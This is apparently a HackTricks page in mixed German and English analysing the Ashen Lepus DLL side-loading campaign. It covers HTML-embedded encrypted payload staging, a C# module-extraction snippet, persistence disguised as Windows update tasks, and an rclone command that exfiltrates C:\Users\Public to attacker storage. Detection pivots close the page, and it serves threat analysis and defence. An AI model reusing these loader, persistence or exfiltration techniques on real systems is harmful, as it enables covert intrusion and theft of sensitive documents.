# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) setzte ein wiederholbares Muster ein, das DLL sideloading, staged HTML payloads und modulare .NET backdoors verknüpft, um in diplomatischen Netzwerken des Nahen Ostens persistent zu bleiben. Die Technik ist für jeden Operator wiederverwendbar, da sie auf Folgendem beruht:

- **Archive-based social engineering**: harmlose PDFs fordern die Ziele auf, ein RAR-Archiv von einer File-Sharing-Site herunterzuladen. Das Archiv bündelt einen echt aussehenden Document viewer EXE, eine bösartige DLL, die nach einer vertrauenswürdigen Bibliothek benannt ist (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), und eine decoy `Document.pdf`.
- **DLL search order abuse**: das Opfer doppelklickt die EXE, Windows löst die DLL-Importe aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) führt sich im vertrauenswürdigen Prozess aus, während die decoy PDF geöffnet wird, um Verdacht zu vermeiden.
- **Living-off-the-land staging**: jede spätere Stage (AshenStager → AshenOrchestrator → modules) verbleibt solange wie möglich nicht auf der Festplatte, sondern wird bei Bedarf als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten versteckt sind.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: Die EXE side-loads AshenLoader, der host recon durchführt, diesen mit AES-CTR verschlüsselt und per POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-artige Pfade (z. B. `/api/v2/account`) sendet.
2. **HTML extraction**: Der C2 verrät die nächste Stage nur, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` zum Implant passt, was Sandboxes frustriert. Wenn die Prüfungen bestehen, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Second sideload**: AshenStager wird zusammen mit einer weiteren legitimen Binary bereitgestellt, die `wtsapi32.dll` importiert. Die in die Binary injizierte bösartige Kopie holt weiteres HTML, dieses Mal wird `<article>...</article>` ausgeschnitten, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64-kodierte JSON-Konfiguration decodiert. Die Config-Felder `tg` und `au` werden konkateniert/gehasht, um den AES-Key zu bilden, mit dem `xrk` entschlüsselt wird. Die resultierenden Bytes dienen anschließend als XOR-Schlüssel für jedes nachgeladene Modul-Blob.
5. **Module delivery**: Jedes Modul wird über HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umlenken und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) und file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angezeigte Tag ändern, um die Auslieferung wiederaufzunehmen.

## Krypto- & C2-Härtung

- **AES-CTR everywhere**: aktuelle Loader betten 256-Bit-Schlüssel plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht mit Strings wie `msasn1.dll` vor/nach der Entschlüsselung hinzu.
- **Recon smuggling**: aufgelistete Daten enthalten jetzt Program Files-Verzeichnisse, um besonders wertvolle Apps zu identifizieren, und werden immer verschlüsselt, bevor sie den Host verlassen.
- **URI churn**: Abfrageparameter und REST-Pfade wechseln zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Erkennungen ungültig werden.
- **Gated delivery**: Server sind geografisch eingeschränkt (geo-fenced) und antworten nur echten Implants. Nicht zugelassene Clients erhalten unauffälliges HTML.

## Persistenz & Ausführungsschleife

AshenStager legt geplante Aufgaben ab, die sich als Windows‑Wartungsjobs tarnen und über `svchost.exe` ausgeführt werden, z. B.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Aufgaben starten die sideloading chain beim Booten oder in Intervallen neu und stellen so sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut die Festplatte zu verwenden.

## Verwendung legitimer Sync-Clients für Exfiltration

Operatoren legen diplomatische Dokumente in `C:\Users\Public` ab (weltweit lesbar und unverdächtig) über ein dediziertes Modul und laden dann das legitime [Rclone](https://rclone.org/) Binary herunter, um dieses Verzeichnis mit vom Angreifer kontrolliertem Speicher zu synchronisieren:

1. **Stage**: Ziel-Dateien in `C:\Users\Public\{campaign}\` kopieren/sammeln.
2. **Configure**: Eine Rclone-Konfiguration liefern, die auf einen vom Angreifer kontrollierten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, damit der Verkehr normalen Cloud-Backups ähnelt.

Da Rclone weit verbreitet für legitime Backup-Workflows genutzt wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, ungewöhnliche Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).

## Erkennungs-Pivots

- Alarmieren bei **signierten Prozessen**, die unerwartet DLLs aus benutzerschreibbaren Pfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), besonders wenn die DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` übereinstimmen.
- Verdächtige HTTPS-Antworten auf **große Base64-Blobs, die in ungewöhnlichen Tags eingebettet sind**, oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt, untersuchen.
- Nach **geplanten Aufgaben** suchen, die `svchost.exe` mit Nicht-Service-Argumenten ausführen oder auf dropper directories zurückzeigen.
- Auf **Rclone**-Binaries achten, die außerhalb von IT-verwalteten Orten auftauchen, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.

## Referenzen

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
